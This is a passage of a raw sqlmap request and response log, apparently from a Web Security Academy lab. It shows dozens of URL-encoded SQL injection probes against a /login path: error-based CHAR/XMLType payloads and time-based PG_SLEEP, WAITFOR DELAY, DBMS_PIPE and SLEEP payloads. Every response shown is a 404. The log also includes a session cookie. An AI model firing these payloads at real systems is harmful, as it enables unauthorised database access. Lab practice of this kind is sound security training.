+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%289752%3D9752
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#29]:
+GET /login%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#29] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#30]:
+GET /login%27%29%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%28%27fFMb%27%3D%27fFMb HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#30] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%28%27fFMb%27%3D%27fFMb
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#31]:
+GET /login%27%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%27XMWH%27%3D%27XMWH HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#31] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%27XMWH%27%3D%27XMWH
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#32]:
+GET /login%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20dqyK HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#32] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%202314%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282314%3D2314%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20dqyK
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#33]:
+GET /login%29%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%288320%3D8320 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#33] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%288320%3D8320
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#34]:
+GET /login%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#34] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#35]:
+GET /login%27%29%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27ylps%27%3D%27ylps HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#35] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27ylps%27%3D%27ylps
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#36]:
+GET /login%27%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27MCoH%27%3D%27MCoH HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#36] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27MCoH%27%3D%27MCoH
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#37]:
+GET /login%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20vxSY HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#37] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%207211%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287211%3D7211%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20vxSY
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#38]:
+GET /%28SELECT%20CONCAT%28CONCAT%28%27qpqpq%27%2C%28CASE%20WHEN%20%288192%3D8192%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qbkxq%27%29%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#38] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/%28SELECT%20CONCAT%28CONCAT%28%27qpqpq%27%2C%28CASE%20WHEN%20%288192%3D8192%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qbkxq%27%29%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#39]:
+GET /login%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#39] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%3BSELECT%20PG_SLEEP%285%29--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#40]:
+GET /login%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#40] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%3BSELECT%20PG_SLEEP%285%29--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#41]:
+GET /login%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#41] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%3BSELECT%20PG_SLEEP%285%29--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#42]:
+GET /login%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#42] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%3BSELECT%20PG_SLEEP%285%29--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#43]:
+GET /login%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#43] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#44]:
+GET /login%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#44] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#45]:
+GET /login%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#45] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#46]:
+GET /login%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#46] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#47]:
+GET /login%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#47] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#48]:
+GET /login%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#48] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#49]:
+GET /login%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#49] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#50]:
+GET /login%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#50] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%28119%29%7C%7CCHR%28108%29%7C%7CCHR%2867%29%2C5%29%20FROM%20DUAL--
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#51]:
+GET /login%29%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%284145%3D4145 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#51] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%29%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%284145%3D4145
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#52]:
+GET /login%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29 HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#52] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#53]:
+GET /login%27%29%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%28%27NtrD%27%3D%27NtrD HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#53] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%29%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%28%27NtrD%27%3D%27NtrD
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#54]:
+GET /login%27%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%27Tpwu%27%3D%27Tpwu HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.11#stable (https://sqlmap.org)
+Cookie: session=BAnk3njzdy2ZRNHWvR8eSU1TdNsDpYbq
+Host: 0a85007504dbef82c0834c4100e6004b.web-security-academy.net
+Accept: */*
+Accept-encoding: gzip,deflate
+Connection: close
+
+HTTP response [#54] (404 Not Found):
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 11
+URI: https://0a85007504dbef82c0834c4100e6004b.web-security-academy.net:443/login%27%20AND%20%28SELECT%203544%20FROM%20%28SELECT%28SLEEP%285%29%29%29psnI%29%20AND%20%27Tpwu%27%3D%27Tpwu
+
+"Not Found"
+
+############################################################################
+
+HTTP request [#55]:
